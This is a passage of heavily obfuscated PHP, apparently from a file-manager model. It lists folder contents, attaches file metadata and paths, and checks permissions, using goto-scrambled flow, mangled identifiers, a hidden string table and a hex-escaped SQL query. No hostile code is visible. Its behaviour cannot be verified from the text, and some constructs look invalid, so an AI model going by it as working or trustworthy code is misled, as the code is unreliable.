Model($FÈ¢öÇ«ó[399])->get($FÈ¢öÇ«ó[400]); $aïŠñ´‘¦ = Model($FÈ¢öÇ«ó[399])->get($FÈ¢öÇ«ó[401]); goto BÎ›™‘ˆæ; eñœŒ×½Œ¯: if ($bí¬Õ¨¹¬ğ == $FÈ¢öÇ«ó[28]) { } $A¹Ì§Öó¡Å = $FÈ¢öÇ«ó[409] . $f³‚¹—œí–[$bí¬Õ¨¹¬ğ] . $FÈ¢öÇ«ó[50] . $E‚ÚÏ‹Ò©è[$E¯›»ÜÍ¼õ]; return $this->order(rtrim(trim($A¹Ì§Öó¡Å), $FÈ¢öÇ«ó[47])); goto bä£ßô“Îã; BÎ›™‘ˆæ: $E‚ÚÏ‹Ò©è = array($FÈ¢öÇ«ó[402] => $FÈ¢öÇ«ó[403], $FÈ¢öÇ«ó[404] => $FÈ¢öÇ«ó[405]); $f³‚¹—œí– = array($FÈ¢öÇ«ó[28] => $FÈ¢öÇ«ó[28], $FÈ¢öÇ«ó[77] => $FÈ¢öÇ«ó[77], $FÈ¢öÇ«ó[160] => $FÈ¢öÇ«ó[372], $FÈ¢öÇ«ó[378] => $FÈ¢öÇ«ó[378], $FÈ¢öÇ«ó[406] => $FÈ¢öÇ«ó[379], $FÈ¢öÇ«ó[187] => $FÈ¢öÇ«ó[187], $FÈ¢öÇ«ó[107] => $FÈ¢öÇ«ó[107]); $bí¬Õ¨¹¬ğ = Input::get($FÈ¢öÇ«ó[407], $FÈ¢öÇ«ó[7], $dé ‘‡‘Ê˜, array_keys($f³‚¹—œí–)); goto d‰ŒŸ²µšÜ; d‰ŒŸ²µšÜ: $E¯›»ÜÍ¼õ = Input::get($FÈ¢öÇ«ó[408], $FÈ¢öÇ«ó[7], $aïŠñ´‘¦, array_keys($E‚ÚÏ‹Ò©è)); if (!in_array($bí¬Õ¨¹¬ğ, array_keys($f³‚¹—œí–))) { $bí¬Õ¨¹¬ğ = $FÈ¢öÇ«ó[28]; } if (!in_array($E¯›»ÜÍ¼õ, array_keys($E‚ÚÏ‹Ò©è))) { $bí¬Õ¨¹¬ğ = $FÈ¢öÇ«ó[402]; } goto eñœŒ×½Œ¯; bä£ßô“Îã: } protected function _listDataApplyItem($CàØğâÒ¢Ñ, $f»¾¿Ÿƒ± = false) { $CË×ôàâƒÕ = array($CàØğâÒ¢Ñ); $this->_listDataApply($CË×ôàâƒÕ, $f»¾¿Ÿƒ±); return $CË×ôàâƒÕ[0]; } protected function _listDataApply(&$Aª°“Ğ®óš, $BáÏíªŒù = false) { goto EŞ–‹•çêè; E–³ˆ™äë°: $this->_listAppendUser($Aª°“Ğ®óš); $this->_listFilterInfo($Aª°“Ğ®óš, $BáÏíªŒù); goto eñÙ·ò˜ƒù; dÖÔÍóé§Š: $D‚ŠÒöœ­ = array_unique($D‚ŠÒöœ­); $this->_listSourceCache($Aª°“Ğ®óš); if (!$BáÏíªŒù) { $this->_listAppendMeta($Aª°“Ğ®óš, $D‚ŠÒöœ­); $this->_listAppendFileMeta($Aª°“Ğ®óš, $D‚ŠÒöœ­); $this->_listAppendChildren($Aª°“Ğ®óš, $D‚ŠÒöœ­); } goto cŠ¥¬Ôº«Á; EŞ–‹•çêè: $e¿ƒ†Äô×Ş =& $_SERVER[¦·]; if (!$Aª°“Ğ®óš) { $Aª°“Ğ®óš = array(); return; } $D‚ŠÒöœ­ = array_to_keyvalue($Aª°“Ğ®óš, $e¿ƒ†Äô×Ş[33], $e¿ƒ†Äô×Ş[369]); goto dÖÔÍóé§Š; cŠ¥¬Ôº«Á: $this->_listAppendPath($Aª°“Ğ®óš); $this->_listAppendAuth($Aª°“Ğ®óš); $this->_listAppendSourceInfo($Aª°“Ğ®óš, $D‚ŠÒöœ­); goto E–³ˆ™äë°; eñÙ·ò˜ƒù: } protected function _listSourceCache($CÄšæÇçÉô) { $BÍ˜™ÆˆÂ =& $_SERVER[¦·]; foreach ($CÄšæÇçÉô as $Fß´ƒÉ‚¿¬) { self::$cacheSourceInfo[$BÍ˜™ÆˆÂ[410] . $Fß´ƒÉ‚¿¬[$BÍ˜™ÆˆÂ[369]]] = $Fß´ƒÉ‚¿¬; } } protected function _listFilterInfo(&$B«Œ±’’Š, $BÓøàÕ¨¥â = false) { $D¾ŠªÌášé =& $_SERVER[¦·]; foreach ($B«Œ±’’Š as &$eæÁ¥¬©ß) { $eæÁ¥¬©ß = $this->pathInfoFilter($eæÁ¥¬©ß); self::$cachePathInfo[$D¾ŠªÌášé[411] . intval($BÓøàÕ¨¥â) . $D¾ŠªÌášé[412] . $eæÁ¥¬©ß[$D¾ŠªÌášé[369]]] = $eæÁ¥¬©ß; } unset($eæÁ¥¬©ß); } protected function _listMake(&$C¥Èñ£¹›±) { $cÓº¸š´‡µ =& $_SERVER[¦·]; $C¥Èñ£¹›±[$cÓº¸š´‡µ[74]] = array(); $C¥Èñ£¹›±[$cÓº¸š´‡µ[73]] = array(); foreach ($C¥Èñ£¹›±[$cÓº¸š´‡µ[354]] as $C‰¶Ú­¬‡Ä) { $b—’ê£…ˆ = $C‰¶Ú­¬‡Ä[$cÓº¸š´‡µ[370]] == 1 ? $cÓº¸š´‡µ[74] : $cÓº¸š´‡µ[73]; $C¥Èñ£¹›±[$b—’ê£…ˆ][] = $C‰¶Ú­¬‡Ä; } unset($C¥Èñ£¹›±[$cÓº¸š´‡µ[354]]); } protected function _listAppendMeta(&$DåÂùä¿ä³, $eàåùø¡Èë) { goto EÃŒÚÅ“‰; aªœïè‚Æ: if (!$b´¨Å¯·Á¥) { return; } $eˆŠ¢éôšè = array($bãœÌƒ™[415], $bãœÌƒ™[416]); $Fõ™”Ÿçğë = array(); goto Fß¥‡ò’¤Ä; EÃŒÚÅ“‰: $bãœÌƒ™ =& $_SERVER[¦·]; $F÷ëªù¹æ = array($bãœÌƒ™[383] => array($bãœÌƒ™[384], $eàåùø¡Èë)); $b´¨Å¯·Á¥ = Model($bãœÌƒ™[413])->field($bãœÌƒ™[414])->where($F÷ëªù¹æ)->select(); goto aªœïè‚Æ; Fß¥‡ò’¤Ä: foreach ($b´¨Å¯·Á¥ as $b­¡ö˜¦â) { if (!isset($Fõ™”Ÿçğë[$b­¡ö˜¦â[$bãœÌƒ™[369]]])) { $Fõ™”Ÿçğë[$b­¡ö˜¦â[$bãœÌƒ™[369]]] = array(); } if (in_array($b­¡ö˜¦â[$bãœÌƒ™[89]], $eˆŠ¢éôšè)) { continue; } $Fõ™”Ÿçğë[$b­¡ö˜¦â[$bãœÌƒ™[369]]][$b­¡ö˜¦â[$bãœÌƒ™[89]]] = $b­¡ö˜¦â[$bãœÌƒ™[359]]; } foreach ($DåÂùä¿ä³ as &$cÁîçôˆˆ‹) { $cÁîçôˆˆ‹[$bãœÌƒ™[417]] = !1; if (isset($Fõ™”Ÿçğë[$cÁîçôˆˆ‹[$bãœÌƒ™[369]]])) { $cÁîçôˆˆ‹[$bãœÌƒ™[417]] = $Fõ™”Ÿçğë[$cÁîçôˆˆ‹[$bãœÌƒ™[369]]]; } if ($this->fileIsLock($cÁîçôˆˆ‹) && $cÁîçôˆˆ‹[$bãœÌƒ™[376]]) { $C¹‚Ô‹Â… = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $cÁîçôˆˆ‹[$bãœÌƒ™[376]][$bãœÌƒ™[377]] = AuthModel::authDisable($cÁîçôˆˆ‹[$bãœÌƒ™[376]][$bãœÌƒ™[377]], $C¹‚Ô‹Â…); $cÁîçôˆˆ‹[$bãœÌƒ™[376]][$bãœÌƒ™[418]][$bãœÌƒ™[376]] = $cÁîçôˆˆ‹[$bãœÌƒ™[376]][$bãœÌƒ™[377]]; } } unset($cÁîçôˆˆ‹); goto B¶Õùã…¤·; B¶Õùã…¤·: } protected function _listAppendFileMeta(&$eæ¨ÙŞĞ§™, $fì°Ó¹ÙİŠ) { goto a×ÁùÒ Û–; a×ÁùÒ Û–: $E­ºˆößë» =& $_SERVER[¦·]; $cñœšµ«Ì¥ = array_to_keyvalue($eæ¨ÙŞĞ§™, $E­ºˆößë»[33], $E­ºˆößë»[419]); $cñœšµ«Ì¥ = array_filter(array_unique($cñœšµ«Ì¥)); goto e’Œ Çà©ß; e’Œ Çà©ß: if (!$cñœšµ«Ì¥) { return; } $fÄˆ›“›Â³ = array($E­ºˆößë»[420] => array($E­ºˆößë»[384], $cñœšµ«Ì¥)); $DÍ“£ŞÂŒ” = $E­ºˆößë»[421]; goto dìÁ¡Å’†; bšĞ»ö¡ùó: foreach ($eæ¨ÙŞĞ§™ as &$cÉÈğŠÙ¿) { goto eÆñäØÑå; eÆñäØÑå: $a°’ƒ“Ø’Æ = $cÉÈğŠÙ¿[$E­ºˆößë»[419]]; if (!$a°’ƒ“Ø’Æ || !isset($AåºùÍñ‹¨[$a°’ƒ“Ø’Æ])) { continue; } $B´©¤…Ö§­ = $AåºùÍñ‹¨[$a°’ƒ“Ø’Æ]; goto aöÙï°ÎÜÈ; f”óñ’ßÙ: unset($AåºùÍñ‹¨[$a°’ƒ“Ø’Æ][$E­ºˆößë»[75]]); $dôæÄµâğ¤ = is_array($AÇ“ãæ™­†[$a°’ƒ“Ø’Æ]) ? $AÇ“ãæ™­†[$a°’ƒ“Ø’Æ] : array(); $cÉÈğŠÙ¿[$E­ºˆößë»[162]] = array_merge($dôæÄµâğ¤, $AåºùÍñ‹¨[$a°’ƒ“Ø’Æ]); goto a×ùã“ˆ¬; a×ùã“ˆ¬: if (isset($cÉÈğŠÙ¿[$E­ºˆößë»[162]][$E­ºˆößë»[426]])) { $cÉÈğŠÙ¿[$E­ºˆößë»[426]] = json_decode($cÉÈğŠÙ¿[$E­ºˆößë»[162]][$E­ºˆößë»[426]], !0); unset($cÉÈğŠÙ¿[$E­ºˆößë»[162]][$E­ºˆößë»[426]]); } goto dÖœ‚Ø¼ğÎ; aöÙï°ÎÜÈ: $B´©¤…Ö§­[$E­ºˆößë»[77]] = $cÉÈğŠÙ¿[$E­ºˆößë»[77]]; $B´©¤…Ö§­[$E­ºˆößë»[28]] = $cÉÈğŠÙ¿[$E­ºˆößë»[28]]; self::$cacheFileInfo[$E­ºˆößë»[425] . $a°’ƒ“Ø’Æ] = array_merge(array(), $B´©¤…Ö§­); goto f”óñ’ßÙ; dÖœ‚Ø¼ğÎ: } unset($cÉÈğŠÙ¿); goto CÃ‚ß‘äì; dìÁ¡Å’†: $AåºùÍñ‹¨ = Model($E­ºˆößë»[422])->field($DÍ“£ŞÂŒ”)->where($fÄˆ›“›Â³)->select(); $AåºùÍñ‹¨ = array_to_keyvalue($AåºùÍñ‹¨, $E­ºˆößë»[419]); $EÓÑÊß²è = Model($E­ºˆößë»[423])->field($E­ºˆößë»[424])->where($fÄˆ›“›Â³)->select(); goto b›Ù†Ñ·ƒ™; b›Ù†Ñ·ƒ™: $EÓÑÊß²è = $EÓÑÊß²è ? $EÓÑÊß²è : array(); $AÇ“ãæ™­† = array(); foreach ($EÓÑÊß²è as $dè´²•‹Õ¶) { if (!isset($AÇ“ãæ™­†[$dè´²•‹Õ¶[$E­ºˆößë»[419]]])) { $AÇ“ãæ™­†[$dè´²•‹Õ¶[$E­ºˆößë»[419]]] = array(); } $AÇ“ãæ™­†[$dè´²•‹Õ¶[$E­ºˆößë»[419]]][$dè´²•‹Õ¶[$E­ºˆößë»[89]]] = $dè´²•‹Õ¶[$E­ºˆößë»[359]]; } goto bšĞ»ö¡ùó; CÃ‚ß‘äì: } protected function _listAppendSourceInfo(&$F‡àÆôòÚÅ, $AãËí”ÇŠ) { goto BŒ¶ÜÅ²ò; Aåß¦ÚÙŠ¨: $B±œîƒ‡·Í = array_to_keyvalue($fƒÁ¥öĞä, $dÍà…‰¼Üæ[367]); $AÁîø‰·ŒÎ = array_to_keyvalue_group($c„Çê®Æğ•, $dÍà…‰¼Üæ[75], $dÍà…‰¼Üæ[393]); $FÈš˜œí’¯ = array_to_keyvalue($F‹Í¦İÃ»©, $dÍà…‰¼Üæ[75]); goto CëŒ·‹¼°Â; BŒ¶ÜÅ²ò: $dÍà…‰¼Üæ =& $_SERVER[¦·]; if (!defined($dÍà…‰¼Üæ[427])) { return; } $fƒÁ¥öĞä = Model($dÍà…‰¼Üæ[428])->listData(); goto aíÛÃ½¢õĞ; DƒÎµ÷ÇŞÒ: return $F‡àÆôòÚÅ; goto eİÊ¤²±–™; aíÛÃ½¢õĞ: $c„Çê®Æğ• = Model($dÍà…‰¼Üæ[392])->listData(); $F‹Í¦İÃ»© = Model($dÍà…‰¼Üæ[381])->listData(); $cµ‘ÊÒ³¦ç = Model($dÍà…‰¼Üæ[429])->listSimple(); goto Aåß¦ÚÙŠ¨; CëŒ·‹¼°Â: $C½…ªƒÅ®• = array_to_keyvalue_group($cµ‘ÊÒ³¦ç, $dÍà…‰¼Üæ[369]); foreach ($F‡àÆôòÚÅ as &$d©âÆ—¥Š—) { $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]] = array($dÍà…‰¼Üæ[430] => 0, $dÍà…‰¼Üæ[431] => 0, $dÍà…‰¼Üæ[432] => 0); if (isset($FÈš˜œí’¯[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]])) { $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[433]] = 1; $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[434]] = $FÈš˜œí’¯[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]][$dÍà…‰¼Üæ[28]]; } if (isset($AÁîø‰·ŒÎ[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]])) { $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[435]] = array(); foreach ($AÁîø‰·ŒÎ[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]] as $e÷êœ™­ñ²) { $E³¯‡„„îŠ = $B±œîƒ‡·Í[$e÷êœ™­ñ²]; $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[435]][] = array($dÍà…‰¼Üæ[436] => $E³¯‡„„îŠ[$dÍà…‰¼Üæ[367]], $dÍà…‰¼Üæ[386] => $E³¯‡„„îŠ[$dÍà…‰¼Üæ[28]], $dÍà…‰¼Üæ[437] => $E³¯‡„„îŠ[$dÍà…‰¼Üæ[438]]); } } if (isset($C½…ªƒÅ®•[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]])) { $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[439]] = array(); foreach ($C½…ªƒÅ®•[$d©âÆ—¥Š—[$dÍà…‰¼Üæ[369]]] as $A¡’¶–Ì‹à) { $d©âÆ—¥Š—[$dÍà…‰¼Üæ[391]][$dÍà…‰¼Üæ[439]] = array($dÍà…‰¼Üæ[440] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[441]], $dÍà…‰¼Üæ[442] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[443]], $dÍà…‰¼Üæ[444] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[369]], $dÍà…‰¼Üæ[445] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[446]], $dÍà…‰¼Üæ[447] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[448]], $dÍà…‰¼Üæ[449] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[449]], $dÍà…‰¼Üæ[450] => $A¡’¶–Ì‹à[$dÍà…‰¼Üæ[450]]); } } } unset($d©âÆ—¥Š—); goto DƒÎµ÷ÇŞÒ; eİÊ¤²±–™: } protected function _listAppendChildren(&$aÂ‚·ªİ±Ú, $f¦…›“£) { goto a‘ˆòîÉËÒ; a¨Ê½¦åï„: foreach ($aÂ‚·ªİ±Ú as &$D´é‰…ç¤Š) { if ($D´é‰…ç¤Š[$E™Ü«¢Ë³[370]]) { unset($D´é‰…ç¤Š[$E™Ü«¢Ë³[372]]); $D´é‰…ç¤Š[$E™Ü«¢Ë³[192]] = intval($eÇô“±ëŒ§[$D´é‰…ç¤Š[$E™Ü«¢Ë³[369]] . $E™Ü«¢Ë³[453]][$E™Ü«¢Ë³[454]]); $D´é‰…ç¤Š[$E™Ü«¢Ë³[191]] = intval($eÇô“±ëŒ§[$D´é‰…ç¤Š[$E™Ü«¢Ë³[369]] . $E™Ü«¢Ë³[455]][$E™Ü«¢Ë³[454]]); } } unset($D´é‰…ç¤Š); goto böùÆª; B§¡ øÙˆğ: $B¯öÖŞÈŸ¬ = $this->tablePrefix . $this->tableName; for ($C®œÙ‚ó¥¸ = 0; $C®œÙ‚ó¥¸ < $a¸¢Ì‘Ú; $C®œÙ‚ó¥¸++) { $a˜ÉÆõ¦§Ó = intval($aÂ‚·ªİ±Ú[$C®œÙ‚ó¥¸][$E™Ü«¢Ë³[397]]); if ($aÂ‚·ªİ±Ú[$C®œÙ‚ó¥¸][$E™Ü«¢Ë³[370]]) { $aÂÁãœÁËÛ = $aÂ‚·ªİ±Ú[$C®œÙ‚ó¥¸][$E™Ü«¢Ë³[369]]; $dŒÍ¤ïĞå .= "\x53\x45\x4c\x45\103\124\x20\52\40\x46\x52\117\115\40\x28\123\x45\114\x45\103\124\x20\x27{$aÂÁãœÁËÛ}\137\150\x61\x73\x46\x69\x6c\x65\x27\x20\141\x73\x20\150\141\163\54\x63\x6f\x75\156\164\x28\61\51\40\141\163\40\150\141\163\x43\x6f\165\x6e\164\x20\106\x52\x4f\115\40\x60{$B¯öÖŞÈŸ¬}\140\x20\12\x9\11\x9\11\11\x77\x68\x65\162\145\40\x70\141\162\x65\x6e\164\x49\104\75{$aÂÁãœÁËÛ}\x20\x61\156\144\40\151\x73\106\157\x6c\x64\x65\x72\75\60\40\x61\156\144\40\x69\163\x44\x65\x6c\145\x74\145\x3d{$a˜ÉÆõ¦§Ó}\51\x20\141\163\x20\164\x62\x31\137{$aÂÁãœÁËÛ}\40\x75\156\151\157\x6e\40\141\x6c\154\x20\12\x9\x9\x9\11\x9\123\105\x4c\105\103\124\x20\x2a\40\x46\x52\x4f\x4d\40\50\123\105\x4c\105\x43\124\40\47{$aÂÁãœÁËÛ}\x5f\150\x61\163\x46\x6f\154\x64\x65\162\x27\40\141\x73\40\x68\x61\163\106\151\x6c\145\x2c\x63\x6f\x75\x6e\164\x28\61\51\x20\x61\163\40\x68\x61\163\x43\x6f\x75\x6e\x74\x20\x46\122\x4f\115\40\x60{$B¯öÖŞÈŸ¬}\x60\x20\xa\11\x9\11\11\x9\x77\x68\145\162\145\x20\x70\141\162\145\x6e\164\111\104\x3d{$aÂÁãœÁËÛ}\40\x61\x6e\x64\x20\151\163\x46\157\154\x64\x65\x72\75\x31\40\141\156\x64\x20\x69\x73\104\145\154\x65\x74\145\75{$a˜ÉÆõ¦§Ó}\x29\x20\x61\163\40\x74\x62\62\x5f{$aÂÁãœÁËÛ}\40\x75\156\x69\157\156\40\141\154\154\40"; } if ((strlen($dŒÍ¤ïĞå) >= $E›ƒŒßŠ© || $C®œÙ‚ó¥¸ == $a¸¢Ì‘Ú - 1) && $dŒÍ¤ïĞå) { $dŒÍ¤ïĞå = substr($dŒÍ¤ïĞå, 0, -strlen($E™Ü«¢Ë³[451])); $D²Ä×Õ¯‹” = $this->query($dŒÍ¤ïĞå); $eÇô“±ëŒ§ = array_merge($eÇô“±ëŒ§, $D²Ä×Õ¯‹”); $dŒÍ¤ïĞå = $E™Ü«¢Ë³[33]; } } $eÇô“±ëŒ§ = array_to_keyvalue($eÇô“±ëŒ§, $E™Ü«¢Ë³[452]); goto a¨Ê½¦åï„; f‚Ö…‘¡¯ö: $E›ƒŒßŠ© = 1024 * 50; $aÂ‚·ªİ±Ú = is_array($aÂ‚·ªİ±Ú) ? $aÂ‚·ªİ±Ú : array(); $a¸¢Ì‘Ú = count($aÂ‚·ªİ±Ú); goto B§¡ øÙˆğ; a‘ˆòîÉËÒ: $E™Ü«¢Ë³ =& $_SERVER[¦·]; $dŒÍ¤ïĞå = $E™Ü«¢Ë³[361]; $eÇô“±ëŒ§ = array(); goto f‚Ö…‘¡¯ö; böùÆª: } protected function _listAppendAuth(&$E»¯Éã¥) { goto E”‰Ûƒ™£¾; e›‚»³óŒà: foreach ($E»¯Éã¥ as $c†Ä¼ã×—Ø) { if ($c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[371]] == self::TYPE_GROUP) { $dõòòëñ§§[] = $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[369]]; } } if (!$dõòòëñ§§) { return; } $eîÊê¥”“ß = array_to_keyvalue($E»¯Éã¥, $F¡­˜ŒœèŞ[369]); goto cœÉŸØù¢½; cœÉŸØù¢½: $B™çÌŸö‘… = Model($F¡­˜ŒœèŞ[456])->getSourceList($dõòòëñ§§, $eîÊê¥”“ß); foreach ($E»¯Éã¥ as $E½Ğ†‡ôõğ => &$c†Ä¼ã×—Ø) { $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]] = $B™çÌŸö‘…[$c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[369]]]; if (!$c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]] && $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[371]] == self::TYPE_GROUP) { $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]] = Action($F¡­˜ŒœèŞ[457])->pathGroupAuthMake($c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[458]]); if (!$c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]] && !_get($GLOBALS, $F¡­˜ŒœèŞ[459])) { $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[189]] = !1; $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[188]] = !1; } } if ($c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]]) { $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[189]] = AuthModel::authCheckEdit($c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]][$F¡­˜ŒœèŞ[377]]); $c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[188]] = AuthModel::authCheckView($c†Ä¼ã×—Ø[$F¡­˜ŒœèŞ[376]][$F¡­˜ŒœèŞ[377]]); } $this->groupPathDisplay($c†Ä¼ã×—Ø); } unset($c†Ä¼ã×—Ø); goto a¨À×ÃéÍê; E”‰Ûƒ™£¾: $F¡­˜ŒœèŞ =& $_SERVER[¦·]; if (!defined($F¡­˜ŒœèŞ[427])) { return; } $dõòòëñ§§ = array(); goto e›‚»³óŒà; a¨À×ÃéÍê: } public function groupPathDisplay(&$bãÛ©„£ª) { goto eÄ¿ô˜–ÊÅ; d•»Ğ‰Ğ: $E¤¦ƒ„…¿å = $this->parentLevelArray($f„¶ÁÕßËí[$eéË¤É¼Ğ‡[461]]); $A±£‹Ô´éÈ = $eéË¤É¼Ğ‡[33]; foreach ($E¤¦ƒ„…¿å as $cĞîÛ´Ù) { $bâò¹Ò’Ôâ = Model($eéË¤É¼Ğ‡[460])->getInfo($cĞîÛ´Ù); $A±£‹Ô´éÈ .= $bâò¹Ò’Ôâ[$eéË¤É¼Ğ‡[391]][$eéË¤É¼Ğ‡[369]] . $eéË¤É¼Ğ‡[47]; } goto DÔ¥¢…ŠÊ; DÔ¥¢…ŠÊ: $bãÛ©„£ª[$eéË¤É¼Ğ‡[462]] = $f„¶ÁÕßËí[$eéË¤É¼Ğ‡[463]]; $bãÛ©„£ª[$eéË¤É¼Ğ‡[380]] = $f„¶ÁÕßËí[$eéË¤É¼Ğ‡[461]]; $bãÛ©„£ª[$eéË¤É¼Ğ‡[464]] = $f„¶ÁÕßËí[$eéË¤É¼Ğ‡[465]]; goto D–ãÛã¼ÌŠ; eÄ¿ô˜–ÊÅ: $eéË¤É¼Ğ‡ =& $_SERVER[¦·]; if ($bãÛ©„£ª[$eéË¤É¼Ğ‡[371]] != self::TYPE_GROUP) { return; } $f„¶ÁÕßËí = Model($eéË¤É¼Ğ‡[460])->getInfo($bãÛ©„£ª[$eéË¤É¼Ğ‡[458]]); goto d•»Ğ‰Ğ; D–ãÛã¼ÌŠ: $bãÛ©„£ª[$eéË¤É¼Ğ‡[466]] = $A±£‹Ô´éÈ . $f„¶ÁÕßËí[$eéË¤É¼Ğ‡[391]][$eéË¤É¼Ğ‡[369]]; goto cêÜŸ“µ¨´; cêÜŸ“µ¨´: } protected function _listAppendPath(&$eÕè½…†Åœ) { goto F—é‚·Ê˜…; F—é‚·Ê˜…: $Fåàİâ¥·Û =& $_SERVER[¦·]; static $B¡œÑ‰†ã = array(); $F˜š˜°öÃé = array(); goto aÛâãºğÆ; eÜ½²‰¹…¡: return $eÕè½…†Åœ; goto Dğåß‹ÔÍ; D”Ôïíï¶: $Bº¼Ê³Ö³ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($eÕè½…†Åœ as &$d¥˜ŞœÜ¸) { goto E¥±…”—¡‹; D­“õ¸İ©: $Bğ½¶¯³¦Ñ = trim($d¥˜ŞœÜ¸[$Fåàİâ¥·Û[468]], $Fåàİâ¥·Û[8]); if ($d¥˜ŞœÜ¸[$Fåàİâ¥·Û[463]] == $Fåàİâ¥·Û[470] && $Bğ½¶¯³¦Ñ) { $d¥˜ŞœÜ¸[$Fåàİâ¥·Û[28]] = $Bğ½¶¯³¦Ñ; } $this->_listAppendPathRecycle($d¥˜ŞœÜ¸, $DôÔ¦òôç, $Bº¼Ê³Ö³); goto e½²¤Ş¥õ; A¶ñ³Íï: if ($DôÔ¦òôç) { $dÇ¹İ¾¦Œò .= $d¥˜ŞœÜ¸[$Fåàİâ¥·Û[28]]; } if ($d¥˜ŞœÜ¸[$Fåàİâ¥·Û[370]]) { $dÇ¹İ¾¦Œò .= $Fåàİâ¥·Û[8]; } $d¥˜ŞœÜ¸[$Fåàİâ¥·Û[468]] = str_replace($Fåàİâ¥·Û[469], $Fåàİâ¥·Û[8], $dÇ¹İ¾¦Œò); goto D­“õ¸İ©; E¥±…”—¡‹: $DôÔ¦òôç = $this->parentLevelArray($d¥˜ŞœÜ¸[$Fåàİâ¥·Û[461]]); $dÇ¹İ¾¦Œò = $this->_listAppendPathRoot($d¥˜ŞœÜ¸, $DôÔ¦òôç); foreach ($DôÔ¦òôç as $AÄá´¬ƒª‹ => $Bœ«†İÀõĞ) { if ($AÄá´¬ƒª‹ == 0 && $dÇ¹İ¾¦Œò && $d¥˜ŞœÜ¸[$Fåàİâ¥·Û[371]] == self::TYPE_GROUP) { continue; } if (isset($B¡œÑ‰†ã[$Bœ«†İÀõĞ])) { $dÇ¹İ¾¦Œò .= $B¡œÑ‰†ã[$Bœ«†İÀõĞ] . $Fåàİâ¥·Û[8]; } } goto A¶ñ³Íï; e½²¤Ş¥õ: } unset($d¥˜ŞœÜ¸); goto eÜ½²‰¹…¡; aÛâãºğÆ: foreach ($eÕè½…†Åœ as &$d¥˜ŞœÜ¸) { $B¡œÑ‰†ã[$d¥˜ŞœÜ¸[$Fåàİâ¥·Û[369]]] = $d¥˜ŞœÜ¸[$Fåàİâ¥·Û[28]]; $DôÔ¦òôç = $this->parentLevelArray($d¥˜ŞœÜ¸[$Fåàİâ¥·Û[461]]); foreach ($DôÔ¦òôç as $AÄá´¬ƒª‹ => $Bœ«†İÀõĞ) { if ($AÄá´¬ƒª‹ != 0 && !isset($B¡œÑ‰†ã[$Bœ«†İÀõĞ])) { $F˜š˜°öÃé[] = $Bœ«†İÀõĞ; } } } unset($d¥˜ŞœÜ¸); if (count($F˜š˜°öÃé) > 0) { $E–àÉï½Ø = array($Fåàİâ¥·Û[383] => array($Fåàİâ¥·Û[384], $F˜š˜°öÃé)); if (count($F˜š˜°öÃé) == 1) { $FÎ«ìâ‹™‘ = $this->sourceInfo($F˜š˜°öÃé[0]); $bÚ¢©ˆóèè = is_array($FÎ«ìâ‹™‘) ? array($FÎ«ìâ‹™‘) : !1; } else { $bÚ¢©ˆóèè = $this->field($Fåàİâ¥·Û[467])->where($E–àÉï½Ø)->select(); } $cØ«ÊÎïóÜ = array_to_keyvalue($bÚ¢©ˆóèè, $Fåàİâ¥·Û[369], $Fåàİâ¥·Û[28]); $B¡œÑ‰†ã = array_merge_index($B¡œÑ‰†ã, $cØ«ÊÎïóÜ); } goto D”Ôïíï¶; Dğåß‹ÔÍ: } private function _listAppendPathRecycle(&$bœÂºæ’ì‹, $B¶ÜÉéÊê‘, $a®à‘­ø‰›) { goto fŠ¦†–¢‡î; cù÷Äïç‚‡: $bœÂºæ’ì‹[$Aí»¸îÛÈà[461]] = $Aí»¸îÛÈà[472] . implode($Aí»¸îÛÈà[47], array_slice($B¶ÜÉéÊê‘, 1)) . $Aí»¸îÛÈà[47]; if ($bœÂºæ’ì‹[$Aí»¸îÛÈà[369]] == $a®à‘­ø‰›) { $bœÂºæ’ì‹[$Aí»¸îÛÈà[461]] = $Aí»¸îÛÈà[472]; $bœÂºæ’ì‹[$Aí»¸îÛÈà[463]] = $Aí»¸îÛÈà[470]; $bœÂºæ’ì‹[$Aí»¸îÛÈà[28]] = LNG($Aí»¸îÛÈà[471]); } $bœÂºæ’ì‹[$Aí»¸îÛÈà[473]] = $Aí»¸îÛÈà[474]; goto fé¸ó²Çáõ; fŠ¦†–¢‡î: $Aí»¸îÛÈà =& $_SERVER[¦·]; if (intval($bœÂºæ’ì‹[$Aí»¸îÛÈà[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($a®à‘­ø‰›, $B¶ÜÉéÊê‘) && $bœÂºæ’ì‹[$Aí»¸îÛÈà[369]] != $a®à‘­ø‰›) { return; } goto A²ÊÑ¦šİİ; A²ÊÑ¦šİİ: 